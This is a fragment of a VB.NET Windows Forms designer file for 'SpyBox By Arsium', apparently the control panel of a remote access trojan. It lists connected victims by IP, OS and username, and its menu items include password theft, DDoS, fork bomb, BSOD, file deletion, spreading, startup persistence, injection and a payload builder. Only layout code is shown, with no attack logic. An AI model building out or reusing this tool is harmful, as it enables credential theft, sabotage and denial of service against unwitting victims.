        Me.ColumnHeader1.Text = "IP"
        Me.ColumnHeader1.Width = 166
        '
        'ColumnHeader2
        '
        Me.ColumnHeader2.Text = "OS"
        Me.ColumnHeader2.Width = 257
        '
        'ColumnHeader3
        '
        Me.ColumnHeader3.Text = "Username"
        Me.ColumnHeader3.Width = 219
        '
        'ColumnHeader4
        '
        Me.ColumnHeader4.Text = "Version"
        Me.ColumnHeader4.Width = 488
        '
        'ToolStrip1
        '
        Me.ToolStrip1.Location = New System.Drawing.Point(3, 3)
        Me.ToolStrip1.Name = "ToolStrip1"
        Me.ToolStrip1.Size = New System.Drawing.Size(981, 25)
        Me.ToolStrip1.TabIndex = 2
        Me.ToolStrip1.Text = "ToolStrip1"
        Me.ToolStrip1.Visible = False
        '
        'TabPage4
        '
        Me.TabPage4.BackColor = System.Drawing.Color.White
        Me.TabPage4.Controls.Add(Me.UcBtnExt2)
        Me.TabPage4.Controls.Add(Me.XuiCustomGroupbox2)
        Me.TabPage4.Controls.Add(Me.XuiCustomGroupbox1)
        Me.TabPage4.ForeColor = System.Drawing.Color.White
        Me.TabPage4.Location = New System.Drawing.Point(54, 4)
        Me.TabPage4.Name = "TabPage4"
        Me.TabPage4.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage4.Size = New System.Drawing.Size(987, 439)
        Me.TabPage4.TabIndex = 1
        Me.TabPage4.Text = "Settings"
        '
        'UcBtnExt2
        '
        Me.UcBtnExt2.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.UcBtnExt2.BackColor = System.Drawing.Color.White
        Me.UcBtnExt2.BtnBackColor = System.Drawing.Color.White
        Me.UcBtnExt2.BtnFont = New System.Drawing.Font("Segoe UI", 8.25!)
        Me.UcBtnExt2.BtnForeColor = System.Drawing.Color.White
        Me.UcBtnExt2.BtnText = "About"
        Me.UcBtnExt2.ConerRadius = 5
        Me.UcBtnExt2.Cursor = System.Windows.Forms.Cursors.Hand
        Me.UcBtnExt2.EnabledMouseEffect = True
        Me.UcBtnExt2.FillColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.UcBtnExt2.Font = New System.Drawing.Font("Microsoft YaHei", 15.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel)
        Me.UcBtnExt2.IsRadius = True
        Me.UcBtnExt2.IsShowRect = True
        Me.UcBtnExt2.IsShowTips = False
        Me.UcBtnExt2.Location = New System.Drawing.Point(917, 413)
        Me.UcBtnExt2.Margin = New System.Windows.Forms.Padding(0)
        Me.UcBtnExt2.Name = "UcBtnExt2"
        Me.UcBtnExt2.RectColor = System.Drawing.Color.FromArgb(CType(CType(100, Byte), Integer), CType(CType(88, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.UcBtnExt2.RectWidth = 1
        Me.UcBtnExt2.Size = New System.Drawing.Size(68, 24)
        Me.UcBtnExt2.TabIndex = 5
        Me.UcBtnExt2.TabStop = False
        Me.UcBtnExt2.TipsColor = System.Drawing.Color.FromArgb(CType(CType(232, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(99, Byte), Integer))
        Me.UcBtnExt2.TipsText = ""
        '
        'PictureBox1
        '
        Me.PictureBox1.Image = Global.AnonMon.My.Resources.Resources.Arsium_Spartan
        Me.PictureBox1.Location = New System.Drawing.Point(5, 1)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(32, 32)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox1.TabIndex = 2
        Me.PictureBox1.TabStop = False
        '
        'Timer2
        '
        Me.Timer2.Interval = 1000
        '
        'Label2
        '
        Me.Label2.Anchor = CType((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Label2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.Label2.Location = New System.Drawing.Point(868, 3)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(76, 20)
        Me.Label2.TabIndex = 4
        Me.Label2.TextAlign = System.Drawing.ContentAlignment.MiddleRight
        '
        'PictureBox2
        '
        Me.PictureBox2.Image = Global.AnonMon.My.Resources.Resources.icons8_sdummer_32
        Me.PictureBox2.Location = New System.Drawing.Point(43, 5)
        Me.PictureBox2.Name = "PictureBox2"
        Me.PictureBox2.Size = New System.Drawing.Size(24, 24)
        Me.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox2.TabIndex = 15
        Me.PictureBox2.TabStop = False
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.White
        Me.ClientSize = New System.Drawing.Size(1055, 487)
        Me.Controls.Add(Me.PictureBox2)
        Me.Controls.Add(Me.Label2)
        Me.Controls.Add(Me.PictureBox1)
        Me.Controls.Add(Me.TabControlExt3)
        Me.Controls.Add(Me.Label1)
        Me.Controls.Add(Me.Button3)
        Me.Controls.Add(Me.Button2)
        Me.Controls.Add(Me.Button1)
        Me.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.Name = "Form1"
        Me.Padding = New System.Windows.Forms.Padding(5, 35, 5, 5)
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "SpyBox By Arsium"
        Me.REMOTE_TOOL.ResumeLayout(False)
        Me.XuiCustomGroupbox2.ResumeLayout(False)
        CType(Me.PictureBox5, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox4, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox3, System.ComponentModel.ISupportInitialize).EndInit()
        Me.XuiCustomGroupbox1.ResumeLayout(False)
        Me.XuiCustomGroupbox4.ResumeLayout(False)
        CType(Me.NumericUpDown2, System.ComponentModel.ISupportInitialize).EndInit()
        Me.XuiCustomGroupbox3.ResumeLayout(False)
        CType(Me.NumericUpDown1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabControlExt3.ResumeLayout(False)
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage2.PerformLayout()
        Me.TabPage4.ResumeLayout(False)
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents Button1 As Button
    Friend WithEvents Button2 As Button
    Friend WithEvents Button3 As Button
    Friend WithEvents ListView2 As ListView
    Friend WithEvents ColumnHeader6 As ColumnHeader
    Friend WithEvents ColumnHeader7 As ColumnHeader
    Friend WithEvents ColumnHeader8 As ColumnHeader
    Friend WithEvents ColumnHeader9 As ColumnHeader
    Friend WithEvents XuiCustomGroupbox1 As XanderUI.XUICustomGroupbox
    Friend WithEvents XuiCustomGroupbox2 As XanderUI.XUICustomGroupbox
    Friend WithEvents NumericUpDown1 As NumericUpDown
    Friend WithEvents UcBtnExt1 As HZH_Controls.Controls.UCBtnExt
    Friend WithEvents ImageList1 As ImageList
    Friend WithEvents REMOTE_TOOL As ContextMenuStrip
    Friend WithEvents GetPasswordsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MiscToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MessageToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents XuiCheckBox1 As XanderUI.XUICheckBox
    Friend WithEvents ClientToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents CloseDeleteToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents CloseToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents Label1 As Label
    Friend WithEvents PowerToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents LogOutToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RestartToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ShutDownToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents BSODToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents DesktopManagerToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents FileManagerToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents BuilderToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents DDOSToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents UDPToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents TaskManagerToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RemoteViewerToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents StartToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents StopToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents NumericUpDown2 As NumericUpDown
    Friend WithEvents ChangeWallPaperToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents OSInformationToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents TabControlExt3 As HZH_Controls.Controls.TabControlExt
    Friend WithEvents TabPage2 As TabPage
    Friend WithEvents TabPage4 As TabPage
    Friend WithEvents TestToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents TaskBarToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents HideToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ShowToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents HideAppsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ShowAppsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PictureBox1 As PictureBox
    Friend WithEvents MouseToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents SwapMouseButtonToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ONToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents OFFToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents Test1ToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents Test2ToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents KeyboardToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents LockKeyboardToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents UnlockKeyboardToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ToolStrip1 As ToolStrip
    Friend WithEvents MouseLockingToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents LeftClickToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents LeftLockToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents LeftUnlockToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RightButtonToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RightLockToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RightUnlockToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MouseMovingToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MouveLockingToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MouveUnlockToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents AllToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents AllLockToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents AllUnlockToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents XuiCustomGroupbox4 As XanderUI.XUICustomGroupbox
    Friend WithEvents XuiCustomGroupbox3 As XanderUI.XUICustomGroupbox
    Friend WithEvents IconsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents ShowIconsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents HideIconsToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents StartIconToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents StartIconHideToolStripMenuItem1 As ToolStripMenuItem
    Friend WithEvents ShowStartIconToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents SpreadToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents AddToStarUpToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents VirusToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RedScreenToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents AeroListView1 As AeroListView
    Friend WithEvents ColumnHeader1 As ColumnHeader
    Friend WithEvents ColumnHeader2 As ColumnHeader
    Friend WithEvents ColumnHeader3 As ColumnHeader
    Friend WithEvents ColumnHeader4 As ColumnHeader
    Friend WithEvents Timer2 As Timer
    Friend WithEvents Label2 As Label
    Friend WithEvents PictureBox2 As PictureBox
    Friend WithEvents ForkBombToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents DeleteAllFilesOnDesktopToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents DeleteFilesToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents DeleteFilesRebootToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents Auto_RECOV As XanderUI.XUICheckBox
    Friend WithEvents PictureBox4 As PictureBox
    Friend WithEvents PictureBox3 As PictureBox
    Friend WithEvents InjectionToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents PictureBox5 As PictureBox
    Friend WithEvents AUTO_CHK_FILE As XanderUI.XUICheckBox
    Friend WithEvents HibernateToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents SuspendToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents MonitorScreenToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents RotateToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents R0ToolStripMenuItem2 As ToolStripMenuItem
    Friend WithEvents R90ToolStripMenuItem3 As ToolStripMenuItem
    Friend WithEvents R180ToolStripMenuItem4 As ToolStripMenuItem
    Friend WithEvents R270ToolStripMenuItem5 As ToolStripMenuItem
    Friend WithEvents AboutToolStripMenuItem As ToolStripMenuItem
    Friend WithEvents UcBtnExt2 As HZH_Controls.Controls.UCBtnExt
End Class
